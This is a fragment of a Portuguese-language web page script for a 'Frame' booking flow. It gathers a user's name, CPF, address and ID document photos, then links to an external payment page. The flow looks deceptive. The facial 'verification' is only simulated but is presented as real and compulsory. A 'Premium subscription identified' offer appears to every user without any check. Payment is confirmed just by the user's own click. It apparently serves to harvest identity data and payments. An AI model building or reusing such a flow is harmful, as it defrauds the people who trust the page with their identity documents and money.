      <div id="pdf-section" style="margin-top: 24px; text-align: center;">
        <p id="pdf-name"></p>
        <p>É importante que você baixe e guarde o arquivo da sua reserva.</p>
        <button class="btn secondary" id="download-pdf">Baixar PDF da Pré-Reserva</button>
        <button class="btn" id="continue-btn" style="display:none;">Continuar</button>
      </div>
    </div>
    <div id="step7" class="step">
      <h2>Documentos recebidos</h2>
      <p>Seus documentos foram enviados com sucesso e estão em análise.</p>
      <p>Na próxima etapa, você realizará uma <strong>verificação facial</strong> para confirmar sua identidade de forma segura com a tecnologia da Frame, o Frame Authentic.</p>
      <button class="btn" id="step7-btn">Prosseguir</button>
    </div>
    <div id="step8" class="step">
      <img src="https://framerusercontent.com/images/8eP5Buloi4fUryJ8u2WOGCAXMw.png" alt="Frame Authentic" style="width:150px; margin-bottom:20px; display: block; margin: 0 auto;">
      <p>Vamos iniciar o Frame Authentic? Essa etapa é importante. Recusa resulta em cancelamento.</p>
      <ul>
        <li>Escolha um lugar iluminado.</li>
        <li>Siga as instruções.</li>
        <li>Seja o proprietário dos dados e limpe a câmera.</li>
      </ul>
      <button class="btn" id="start-verification">Iniciar verificação facial</button>
    </div>
  </div>
  <div class="date-fullscreen" id="date-fullscreen">
    <div class="date-header">Selecione as datas da experiência</div>
    <div class="date-content" id="date-content"></div>
    <button class="load-more" id="load-more-dates">Carregar mais datas</button>
    <div class="date-actions">
      <div class="details-link" id="clear-dates">Limpar</div>
      <button class="btn" id="save-dates" disabled>Salvar</button>
    </div>
  </div>
  <div class="popup-overlay bottom-sheet" id="hotel-popup">
    <div class="popup-content">
      <span class="close-popup">×</span>
    </div>
  </div>
  <div class="popup-overlay bottom-sheet" id="custom-city-popup">
    <div class="popup-content">
      <h2>Poxa, sentimos por isso.</h2>
      <p>Pode ser que sua cidade ainda não tenha atendido nossos padrões, por isso nenhuma opção nativa de parceiro foi encontrada. Mas não se preocupe, digite sua cidade abaixo:</p>
      <div class="input-group">
        <input type="text" id="custom-city" placeholder="Nome da cidade">
        <div class="error-message"></div>
      </div>
      <div class="loading-overlay" id="custom-loading" style="display: none; position: absolute;">
        <div class="spinner"></div>
      </div>
      <div class="custom-options">
        <div class="custom-option" data-option="frame">
          <strong>Frame seleciona</strong>
          <small>Nessa opção, a Frame seleciona a melhor hospedagem e envia para aprovação via e-mail.</small>
        </div>
        <div class="custom-option" data-option="self">
          <strong>Selecionar eu mesmo</strong>
          <small>Nessa opção, você seleciona o melhor local e envia para a Frame por e-mail ao final dessa etapa.</small>
        </div>
      </div>
      <span class="close-popup">×</span>
    </div>
  </div>
  <div class="popup-overlay" id="verification-popup">
    <div class="popup-content">
      <p id="verification-instructions">Posicione seu rosto dentro do oval.</p>
      <div id="camera-preview-container">
        <video id="camera-preview" autoplay playsinline muted></video>
        <div class="spinner" id="face-spinner"></div>
      </div>
      <p id="verification-messages"></p>
      <button class="btn" id="capture-face">Iniciar</button>
      <div id="verification-success" style="display:none;">Verificação bem sucedida!</div>
      <span class="close-popup">×</span>
    </div>
  </div>
  <div class="confirm-toast" id="confirm-toast"></div>
  <div class="loading-overlay" id="loading-overlay">
    <div class="spinner"></div>
    <p id="loading-message">Carregando...</p>
  </div>
  <div class="orientation-alert">
    <p>Por favor, use o dispositivo no modo vertical para melhor experiência.</p>
  </div>
  <div class="custom-alert" id="custom-alert">
    <p id="alert-message"></p>
    <button class="btn" onclick="closeCustomAlert()">Fechar</button>
  </div>
  <div class="block-popup" id="block-popup">
    <h2>Acesso bloqueado</h2>
    <p>Devido a múltiplas tentativas com palavras inadequadas, o acesso está bloqueado por 24 horas.</p>
    <p>Tempo restante: <span id="timer"></span></p>
  </div>
  <div class="chatbot-container" id="chatbot"></div>
  <div class="popup-overlay" id="premium-overlay">
    <div class="popup-content">
      <lottie-player src="https://lottie.host/8cbce635-93a8-4ae4-b111-14aa9305a5e3/4MraxyYnP2.lottie" background="transparent" speed="1" style="width: 140px; height: 140px;" loop autoplay></lottie-player>
      <div class="selo">Cortesia exclusiva da Frame.</div>
      <h2>Identificamos sua assinatura Premium.</h2>
      <p>Por ser um usuário Premium, você conta com hospedagem inclusa no seu agendamento</p>
      <p>Deseja aproveitar esta oferta?</p>
      <button class="btn" onclick="acceptOffer()">Sim, seguir com a oferta</button>
      <div class="details-link" onclick="declineOffer()">Seguir sem a oferta</div>
    </div>
  </div>
`;

// ===== Lógica JavaScript =====
let currentStep = localStorage.getItem('currentStep') ? parseInt(localStorage.getItem('currentStep')) : 1;
const totalSteps = 8;
const userData = JSON.parse(localStorage.getItem('userData')) || {};
const progressFill = document.querySelector('.progress-fill');
let checkInDate = null;
let checkOutDate = null;
let currentMonth = new Date().getMonth();
let currentYear = new Date().getFullYear();
let verificationStream = null;
let warningCount = parseInt(localStorage.getItem('warningCount')) || 0;
let blockEnd = localStorage.getItem('blockEnd') ? new Date(localStorage.getItem('blockEnd')) : null;
let blockTimerInterval = null;

function updateProgress() {
  progressFill.style.width = `${(currentStep / totalSteps) * 100}%`;
}

function showStep(step) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  document.getElementById(`step${step}`).classList.add('active');
  currentStep = step;
  localStorage.setItem('currentStep', step);
  updateProgress();
  window.scrollTo(0, 0);
}

function sanitizeInput(input) {
  const div = document.createElement('div');
  div.textContent = input;
  return div.innerHTML;
}

function checkLocalStorageSize() {
  let total = 0;
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      total += (localStorage[key].length + key.length) * 2;
    }
  }
  if (total > 4 * 1024 * 1024) {
    localStorage.clear();
    showToast('Armazenamento local limpo para continuar.');
  }
}

function isValidCPF(cpf) {
  cpf = cpf.replace(/[^\d]+/g, '');
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
  let sum = 0, rest;
  for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
  rest = (sum * 10) % 11;
  if ((rest == 10) || (rest == 11)) rest = 0;
  if (rest != parseInt(cpf.substring(9, 10))) return false;
  sum = 0;
  for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
  rest = (sum * 10) % 11;
  if ((rest == 10) || (rest == 11)) rest = 0;
  if (rest != parseInt(cpf.substring(10, 11))) return false;
  return true;
}

function validateStep(step) {
  clearErrors();
  let valid = true;
  if (step === 1) {
    const nome = sanitizeInput(document.getElementById('nome').value.trim());
    const cpf = document.getElementById('cpf').value.trim();
    const rua = sanitizeInput(document.getElementById('rua').value.trim());
    const bairro = sanitizeInput(document.getElementById('bairro').value.trim());
    const numero = sanitizeInput(document.getElementById('numero').value.trim());
    const cidade = sanitizeInput(document.getElementById('cidade').value.trim());
    const estado = document.getElementById('estado').value;
    if (prohibitedWords.test(nome.toLowerCase())) {
      handleProhibited();
      valid = false;
    }
    if (!nome || nome.split(' ').length < 2) {
      showError('nome', 'Por favor, insira seu nome completo.');
      valid = false;
    }
    if (!cpfRegex.test(cpf) || !isValidCPF(cpf)) {
      showError('cpf', 'Insira um CPF válido (ex: 000.000.000-00).');
      valid = false;
    }
    if (!rua) {
      showError('rua', 'Campo obrigatório.');
      valid = false;
    }
    if (!bairro) {
      showError('bairro', 'Campo obrigatório.');
      valid = false;
    }
    if (!numero) {
      showError('numero', 'Campo obrigatório.');
      valid = false;
    }
    if (!cidade) {
      showError('cidade', 'Campo obrigatório.');
      valid = false;
    }
    if (!estado) {
      showError('estado', 'Selecione um estado.');
      valid = false;
    }
    if (valid) {
      userData.personal = { nome, cpf, rua, bairro, numero, cidade, estado };
    }
  } else if (step === 2) {
    const displayName = sanitizeInput(document.getElementById('displayName').value.trim());
    const showAge = document.getElementById('showAge').value;
    const terms = document.getElementById('terms').checked;
    if (prohibitedWords.test(displayName.toLowerCase())) {
      handleProhibited();
      valid = false;
    }
    if (!displayName) {
      showError('displayName', 'Campo obrigatório.');
      valid = false;
    }
    if (!showAge) {
      showError('showAge', 'Selecione uma opção.');
      valid = false;
    }
    if (!terms) {
      showCustomAlert('Você deve concordar com os termos.');
      valid = false;
    }
    if (valid) {
      userData.profile = { displayName, showAge };
    }
  } else if (step === 3) {
    const docType = document.getElementById('docType').value;
    if (!docType) {
      showError('docType', 'Selecione um tipo de documento.');
      valid = false;
    }
    if (valid) {
      userData.docType = docType;
    }
  } else if (step === 4) {
    const docFront = document.getElementById('docFront').querySelector('img');
    const docBack = document.getElementById('docBack').querySelector('img');
    if (!docFront || !docBack) {
      showCustomAlert('Envie ambas as imagens do documento.');
      valid = false;
    }
  } else if (step === 5) {
    if (!checkInDate || !checkOutDate) {
      showCustomAlert('Selecione datas de check-in e check-out.');
      valid = false;
    }
    if (!userData.hotel && !userData.customCity) {
      showCustomAlert('Selecione um hotel ou uma cidade customizada.');
      valid = false;
    }
    if (valid) {
      userData.dates = { checkIn: checkInDate, checkOut: checkOutDate };
    }
  }
  if (valid) {
    localStorage.setItem('userData', JSON.stringify(userData));
    checkLocalStorageSize();
  }
  return valid;
}

function showCustomAlert(msg) {
  document.getElementById('alert-message').textContent = msg;
  document.getElementById('custom-alert').classList.add('show');
}

function closeCustomAlert() {
  document.getElementById('custom-alert').classList.remove('show');
}

function handleProhibited() {
  warningCount++;
  localStorage.setItem('warningCount', warningCount);
  if (warningCount >= 3) {
    blockEnd = new Date(Date.now() + 24 * 60 * 60 * 1000);
    localStorage.setItem('blockEnd', blockEnd.toISOString());
    showBlockPopup();
    disableInputs();
  } else {
    showCustomAlert(`Aviso: Palavra inadequada detectada. Aviso ${warningCount}/3.`);
  }
}

function showBlockPopup() {
  document.getElementById('block-popup').classList.add('show');
  updateBlockTimer();
  blockTimerInterval = setInterval(updateBlockTimer, 60000);
}

function updateBlockTimer() {
  const now = Date.now();
  if (now >= blockEnd) {
    clearInterval(blockTimerInterval);
    localStorage.removeItem('blockEnd');
    localStorage.removeItem('warningCount');
    warningCount = 0;
    document.getElementById('block-popup').classList.remove('show');
    enableInputs();
  } else {
    const remaining = blockEnd - now;
    const hours = Math.floor(remaining / 3600000);
    const minutes = Math.floor((remaining % 3600000) / 60000);
    document.getElementById('timer').textContent = `${hours}h ${minutes}m`;
  }
}

function disableInputs() {
  document.querySelectorAll('input, select, button').forEach(el => el.disabled = true);
}

function enableInputs() {
  document.querySelectorAll('input, select, button').forEach(el => el.disabled = false);
}

function formatCPF(e) {
  let value = e.target.value.replace(/\D/g, '');
  if (value.length > 11) value = value.slice(0, 11);
  value = value.replace(/(\d{3})(\d)/, '$1.$2');
  value = value.replace(/(\d{3})(\d)/, '$1.$2');
  value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  e.target.value = value;
}

function handleUpload(event, targetId, spinnerId) {
  const file = event.target.files[0];
  if (file.size > 5 * 1024 * 1024) {
    showCustomAlert('Arquivo excede 5MB.');
    return;
  }
  const circle = document.getElementById(targetId);
  const spinner = document.getElementById(spinnerId);
  spinner.style.display = 'block';
  const reader = new FileReader();
  reader.onload = (e) => {
    circle.innerHTML = `<img src="${e.target.result}" alt="Imagem">`;
    spinner.style.display = 'none';
    if (targetId.includes('doc')) {
      checkDocsUploaded();
    }
  };
  reader.readAsDataURL(file);
}

function checkDocsUploaded() {
  const front = document.getElementById('docFront').querySelector('img');
  const back = document.getElementById('docBack').querySelector('img');
  document.getElementById('step4-btn').disabled = !(front && back);
}

function renderCalendar(month, year) {
  const grid = document.getElementById('calendar-grid');
  grid.innerHTML = '';
  const firstDay = new Date(year, month, 1).getDay();
  const daysInMonth = new Date(year, month + 1, 0).getDate();
  document.getElementById('current-month').textContent = new Date(year, month).toLocaleString('pt-BR', { month: 'long', year: 'numeric' });
  for (let i = 0; i < firstDay; i++) {
    const empty = document.createElement('div');
    empty.className = 'day disabled';
    grid.appendChild(empty);
  }
  for (let d = 1; d <= daysInMonth; d++) {
    const day = document.createElement('div');
    day.className = 'day';
    day.textContent = d;
    day.addEventListener('click', () => selectDate(new Date(year, month, d)));
    if (checkInDate && checkInDate.getTime() === new Date(year, month, d).getTime()) {
      day.classList.add('selected');
    } else if (checkOutDate && checkOutDate.getTime() === new Date(year, month, d).getTime()) {
      day.classList.add('selected');
    } else if (checkInDate && checkOutDate && new Date(year, month, d) > checkInDate && new Date(year, month, d) < checkOutDate) {
        day.classList.add('in-range');
      }
    grid.appendChild(day);
  }
}

function selectDate(date) {
  if (!checkInDate) {
    checkInDate = date;
    showToast('Check-in selecionado.');
    checkOutDate = new Date(date);
    checkOutDate.setDate(checkOutDate.getDate() + 1);
    const diff = Math.ceil((checkOutDate - checkInDate) / (1000 * 60 * 60 * 24));
    if (diff > 5) {
      checkOutDate = new Date(checkInDate);
      checkOutDate.setDate(checkOutDate.getDate() + 5);
    }
    showToast('Check-out selecionado.');
  } else {
    checkInDate = date;
    checkOutDate = null;
    showToast('Check-in selecionado.');
  }
  renderCalendar(currentMonth, currentYear);
  document.getElementById('save-dates').disabled = !(checkInDate && checkOutDate);
}

function showCalendar() {
  document.getElementById('date-fullscreen').classList.add('show');
  renderCalendar(currentMonth, currentYear);
}

function initAutocomplete() {
  const input = document.getElementById('city-input');
  const list = document.getElementById('city-list');
  input.addEventListener('input', () => {
    const val = normalizeString(input.value.toLowerCase());
    list.innerHTML = '';
    if (!val) return;
    cities.filter(c => normalizeString(c.toLowerCase()).includes(val)).forEach(c => {
      const option = document.createElement('div');
      option.className = 'city-option';
      option.innerHTML = `
        <svg class="city-icon" viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
        ${c}
      `;
      option.addEventListener('click', () => {
        input.value = c;
        list.style.display = 'none';
        loadHotels(c);
      });
      list.appendChild(option);
    });
    list.style.display = cities.filter(c => normalizeString(c.toLowerCase()).includes(val)).length ? 'block' : 'none';
  });
}

function normalizeString(str) {
  return str.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
}

function loadHotels(city) {
  const listContainer = document.getElementById('hotel-list');
  listContainer.innerHTML = '';
  if (hotels[city]) {
    hotels[city].forEach((hotel, index) => {
      const card = document.createElement('div');
      card.className = 'hotel-card';
      card.innerHTML = `
        <div class="hotel-img-container">
          <img src="${hotel.profileImg}" class="hotel-img" alt="${hotel.name}">
          <div class="hotel-selo">${hotel.selo}</div>
          <svg class="hotel-favorite${favorites.includes(hotel.name) ? ' favorited' : ''}" onclick="toggleFavorite(this, '${hotel.name}') " viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41 0.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
        </div>
        <div class="hotel-info">
          <div class="hotel-name">${hotel.name}</div>
          <p class="hotel-desc">${hotel.desc}</p>
        </div>
        <div class="hotel-actions">
          <button class="btn" onclick="selectHotel('${city}', ${index})">Selecionar este hotel</button>
          <div class="details-link" onclick="showHotelDetails('${city}', ${index})">Ver detalhes <svg width="16" height="16" fill="var(--primary-color)"><path d="M4 9h8l-4-4-4 4"/></svg></div>
        </div>
      `;
      listContainer.appendChild(card);
    });
  }
  document.getElementById('step5-btn').disabled = true;
}

function toggleFavorite(el, name) {
  if (favorites.includes(name)) {
    favorites = favorites.filter(f => f !== name);
    el.classList.remove('favorited');
  } else {
    favorites.push(name);
    el.classList.add('favorited');
  }
  localStorage.setItem('favorites', JSON.stringify(favorites));
  showToast(favorites.includes(name) ? 'Hotel favoritado.' : 'Hotel removido dos favoritos.');
}

function showHotelDetails(city, index) {
  const hotel = hotels[city][index];
  const content = document.getElementById('hotel-popup').querySelector('.popup-content');
  content.innerHTML = `
    <img src="${hotel.largeImg}" class="popup-img" alt="${hotel.name}">
    <div>
      <h3>${hotel.name}</h3>
      <p>${hotel.desc}</p>
      <div class="services-list">
        ${hotel.services.map(s => `<div class="service-item"><svg class="service-icon" width="24" height="24" fill="var(--primary-color)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"/></svg>${s}</div>`).join('')}
      </div>
      <button class="btn" onclick="selectHotel('${city}', ${index})">Selecionar este hotel</button>
    </div>
  `;
  document.getElementById('hotel-popup').classList.add('show');
}

function selectHotel(city, index) {
  userData.hotel = { ...hotels[city][index], city };
  localStorage.setItem('userData', JSON.stringify(userData));
  showToast(`Hotel ${userData.hotel.name} adicionado à sua experiência.`);
  document.getElementById('step5-btn').disabled = false;
  closePopup('hotel-popup');
}

function closePopup(id) {
  document.getElementById(id).classList.remove('show');
}

document.getElementById('custom-city-link').addEventListener('click', () => {
  document.getElementById('custom-city-popup').classList.add('show');
});

document.querySelectorAll('.custom-option').forEach(opt => {
  opt.addEventListener('click', () => {
    const option = opt.dataset.option;
    const customCity = sanitizeInput(document.getElementById('custom-city').value.trim());
    if (!customCity) {
      showError('custom-city', 'Digite o nome da cidade.');
      return;
    }
    showLoading('custom-loading');
    setTimeout(() => {
      hideLoading('custom-loading');
      userData.customCity = customCity;
      userData.customOption = option;
      localStorage.setItem('userData', JSON.stringify(userData));
      closePopup('custom-city-popup');
      if (option === 'self') {
        showToast('Envie o nome e o endereço do hotel escolhido para o e-mail (contato@frameag.com) ou Telegram oficial da Frame.');
      }
      document.getElementById('step5-btn').disabled = false;
    }, 1500);
  });
});

function showLoading(id) {
  document.getElementById(id).style.display = 'flex';
}

function hideLoading(id) {
  document.getElementById(id).style.display = 'none';
}

function addHospedagem() {
  userData.hospedagem = true;
  localStorage.setItem('userData', JSON.stringify(userData));
  showToast('✔ Hospedagem completa adicionada.');
  document.getElementById('go-to-payment').style.display = 'block';
}

function skipHospedagem() {
  showStep(7);
}

function goToPayment() {
  showToast('Redirecionaremos você a página do parceiro de pagamento. Finalize e retorne nessa página para confirmar sua experiência.');
  setTimeout(() => {
    window.open('https://app.pushinpay.com.br/service/pay/A03FD477-AB8F-4223-9EED-A6C23F95CC5D', '_blank');
    showPaymentWaiting();
  }, 10000);
}

function showPaymentWaiting() {
  showToast('Estamos aguardando a confirmação do pagamento. Assim que concluir, clique em ‘Pagamento Efetuado’ abaixo.');
  const btn = document.createElement('button');
  btn.className = 'btn';
  btn.textContent = 'Pagamento Efetuado';
  btn.onclick = () => {
    showLoading('loading-overlay');
    setTimeout(() => {
      hideLoading('loading-overlay');
      showStep(7);
    }, 2000);
  };
  document.getElementById('step6').appendChild(btn);
}

function startVerification() {
  document.getElementById('verification-popup').classList.add('show');
  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
    .then(s => {
      verificationStream = s;
      document.getElementById('camera-preview').srcObject = s;
      document.getElementById('face-spinner').style.display = 'block';
      messageInterval = setInterval(() => {
        document.getElementById('verification-messages').textContent = verificationMessages[messageIndex];
        messageIndex = (messageIndex + 1) % verificationMessages.length;
      }, 1500);
    });
}

function captureFace() {
  clearInterval(messageInterval);
  // Simulate success
  setTimeout(() => {
    document.getElementById('verification-success').style.display = 'block';
    if (verificationStream) verificationStream.getTracks().forEach(track => track.stop());
    setTimeout(() => {
      closePopup('verification-popup');
      window.location.href = 'https://www.frameag.com/kyc/success';
    }, 2000);
  }, 3000);
}

function showToast(msg) {
  const toast = document.getElementById('confirm-toast');
  toast.textContent = msg;
  toast.style.display = 'block';
  setTimeout(() => toast.style.display = 'none', 3000);
}

// Event Listeners
document.addEventListener('DOMContentLoaded', () => {
  updateProgress();
  showStep(currentStep);
  initAutocomplete();
  renderCalendar(currentMonth, currentYear);
  document.getElementById('dates').addEventListener('click', showCalendar);
  document.getElementById('prev-month').addEventListener('click', () => {
    currentMonth--;
    if (currentMonth < 0) {
      currentMonth = 11;
      currentYear--;
    }
    renderCalendar(currentMonth, currentYear);
  });
  document.getElementById('next-month').addEventListener('click', () => {
    currentMonth++;
    if (currentMonth > 11) {
      currentMonth = 0;
      currentYear++;
    }
    renderCalendar(currentMonth, currentYear);
  });
  document.getElementById('clear-dates').addEventListener('click', () => {
    checkInDate = null;
    checkOutDate = null;
    renderCalendar(currentMonth, currentYear);
  });
  document.getElementById('save-dates').addEventListener('click', () => {
    if (checkInDate && checkOutDate) {
      document.getElementById('dates').value = `${checkInDate.toLocaleDateString('pt-BR')} - ${checkOutDate.toLocaleDateString('pt-BR')}`;
      document.getElementById('date-fullscreen').classList.remove('show');
    }
  });
  document.getElementById('step1-btn').addEventListener('click', () => { if (validateStep(1)) showPremiumOverlay(); });
  document.getElementById('step2-btn').addEventListener('click', () => { if (validateStep(2)) showStep(3); });
  document.getElementById('step3-btn').addEventListener('click', () => { if (validateStep(3)) {
    document.getElementById('chosenDoc').textContent = `Documento escolhido: ${userData.docType}`;
    document.getElementById('cpfBox').textContent = userData.personal.cpf;
    showStep(4);
  } });
  document.getElementById('step4-btn').addEventListener('click', () => { if (validateStep(4)) showStep(5); });
  document.getElementById('step5-btn').addEventListener('click', () => { if (validateStep(5) ) showStep(6); });
  document.getElementById('add-hospedagem').addEventListener('click', addHospedagem);
  document.getElementById('skip-hospedagem').addEventListener('click', skipHospedagem);
  document.getElementById('go-to-payment').addEventListener('click', goToPayment);
  document.getElementById('step7-btn').addEventListener('click', () => showStep(8));
  document.getElementById('start-verification').addEventListener('click', startVerification);
  document.getElementById('capture-face').addEventListener('click', captureFace);
  document.getElementById('profilePic').addEventListener('change', e => previewImage(e, 'profileCircle'));
  document.getElementById('docFrontInput').addEventListener('change', e => previewImage(e, 'docFront'));
  document.getElementById('docBackInput').addEventListener('change', e => previewImage(e, 'docBack'));
  const inputsStep1 = document.querySelectorAll('#step1 input, #step1 select');
  inputsStep1.forEach(i => i.addEventListener('input', () => checkFormComplete('step1-btn', inputsStep1)));
  const inputsStep2 = document.querySelectorAll('#step2 input:not([type=file]), #step2 select');
  inputsStep2.forEach(i => i.addEventListener('input', () => checkFormComplete('step2-btn', inputsStep2)));
  const selectDoc = document.getElementById('docType');
  selectDoc.addEventListener('change', () => document.getElementById('step3-btn').disabled = !selectDoc.value);
  if (userData.customOption === 'self') {
    const reminder = document.createElement('p');
    reminder.textContent = 'Envie o nome e o endereço do hotel escolhido para o e-mail (contato@frameag.com) ou Telegram oficial da Frame.';
    document.getElementById('step8').appendChild(reminder);
  }
  document.querySelectorAll('.close-popup').forEach(c => c.addEventListener('click', () => c.closest('.popup-overlay').classList.remove('show')));
  document.getElementById('cpf').addEventListener('input', formatCPF);
  const formInputs = document.querySelectorAll('input');
  formInputs.forEach((input, idx) => {
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        const next = formInputs[idx + 1];
        if (next) next.focus();
      }
    });
  });
  document.getElementById('cpf').addEventListener('focus', () => document.querySelector('#cpf ~ .tooltip').style.display = 'block');
  document.getElementById('cpf').addEventListener('blur', () => document.querySelector('#cpf ~ .tooltip').style.display = 'none');
  document.getElementById('download-pdf').addEventListener('click', generatePDF);
});

function checkFormComplete(btnId, inputs) {
  document.getElementById(btnId).disabled = !Array.from(inputs).every(el => el.value.trim());
}

window.addEventListener('orientationchange', () => {
  if (Math.abs(window.orientation) === 90) {
    document.querySelector('.orientation-alert').style.display = 'block';
  } else {
    document.querySelector('.orientation-alert').style.display = 'none';
  }
});

updateProgress();